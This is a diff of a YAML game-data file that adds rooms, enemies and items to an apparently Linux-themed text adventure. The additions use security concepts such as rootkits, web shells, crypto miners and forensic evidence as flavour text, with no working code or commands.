+  boot_initrd:
+    name: "/boot/initrd"
+    description_seed: "The initial ramdisk. Contains the minimal filesystem and drivers needed to boot the system before the real root filesystem is mounted. If the attacker modifies this, they own the system before the OS even starts."
+    connections:
+      south: {room: boot, type: open}
+
+  secret_root_passage:
+    name: "Root Escalation Shaft"
+    description_seed: "A vertical shaft from the depths to /root. Requires the Sudo Token to ascend. The walls are carved with privilege escalation techniques: SUID binaries, capabilities, kernel exploits. A sysadmin's ladder."
+    connections:
+      down: {room: etc_pam_d, type: open}
+      up: {room: root_home, type: locked}
+
 # =============================================================================
 # ENEMIES
 # =============================================================================
@@ -834,6 +1583,31 @@ enemies:
     hp: 45
     attack: "2d8+2"
     ai: aggressive
+
+  # Phase 1b additions
+  segfault_daemon_2:
+    name: "Segfault Daemon"
+    hp: 12
+    attack: "1d4"
+    ai: aggressive
+
+  crypto_miner:
+    name: "Crypto Miner"
+    hp: 16
+    attack: "1d6"
+    ai: cautious
+
+  web_shell_guardian:
+    name: "Web Shell Guardian"
+    hp: 14
+    attack: "1d6+1"
+    ai: aggressive
+
+  pam_backdoor:
+    name: "PAM Backdoor"
+    hp: 17
+    attack: "1d6+1"
+    ai: cautious
 
 # =============================================================================
 # ITEMS
@@ -1065,6 +1839,84 @@ items:
     type: consumable
     weight: 0.3
     value: 10
+
+  # Phase 1b additions
+  selinux_armor:
+    name: "SELinux Armor"
+    description: "Mandatory Access Control enforcement. The strongest defense on a Linux system — when it's actually enforced. Wearing this, even root-level attacks are contained."
+    type: armor
+    weight: 2.5
+    value: 55
+
+  cache_hit:
+    name: "Cache Hit"
+    description: "A perfectly cached response. Warm, fast, satisfying. Restores a small amount of vitality."
+    type: consumable
+    weight: 0.2
+    value: 3
+
+  c2_decrypt_key:
+    name: "C2 Decryption Key"
+    description: "An AES-256 key found in shared memory. Used to decrypt the attacker's C2 communications. Careless — they should have zeroed the memory."
+    type: key
+    weight: 0.0
+    value: 45
+
+  miner_config:
+    name: "Miner Configuration"
+    description: "The cryptocurrency miner's config file. Mining pool: stratum+tcp://pool.darknet.onion:3333. Wallet: a long hex string. This wallet address could identify the attacker."
+    type: misc
+    weight: 0.1
+    value: 20
+
+  rootkit_source:
+    name: "Rootkit Source Code"
+    description: "The C source code for the kernel rootkit. rootkit.c — hooks sys_getdents64, sys_read, sys_kill. Academic quality code with comments. The author is skilled."
+    type: misc
+    weight: 0.3
+    value: 30
+
+  fortune_cookie:
+    name: "Fortune Cookie"
+    description: "'The best defense against logic bombs is to not have any logic.' — fortune(6)"
+    type: consumable
+    weight: 0.1
+    value: 1
+
+  clean_backup:
+    name: "Clean Backup"
+    description: "A pre-compromise backup of the entire system. Created 4 days ago by the backup operator. Contains original, untampered binaries and configurations. The gold standard for recovery."
+    type: key
+    weight: 0.5
+    value: 70
+
+  audit_report:
+    name: "Security Audit Report"
+    description: "A security audit from 6 months ago. Lists 23 critical vulnerabilities. Status: 0 remediated. The legacy app's deserialization flaw is finding #3."
+    type: misc
+    weight: 0.2
+    value: 15
+
+  usb_drive:
+    name: "USB Drive"
+    description: "A USB flash drive someone used to start collecting forensic evidence. The investigation was abandoned — but the evidence collected so far is useful."
+    type: misc
+    weight: 0.1
+    value: 10
+
+  pcap_evidence:
+    name: "Packet Capture"
+    description: "A pcap file showing the initial exploit. The attacker sent a crafted HTTP POST to the legacy app — a serialized Java object that executed arbitrary code. The smoking gun."
+    type: misc
+    weight: 0.1
+    value: 35
+
+  recovered_fragment:
+    name: "Recovered Fragment"
+    description: "A file fragment recovered by fsck from /lost+found. Partial contents of the attacker's initial command history — the first commands they ran after gaining access."
+    type: misc
+    weight: 0.1
+    value: 15
 
 # =============================================================================
 # SPELLS
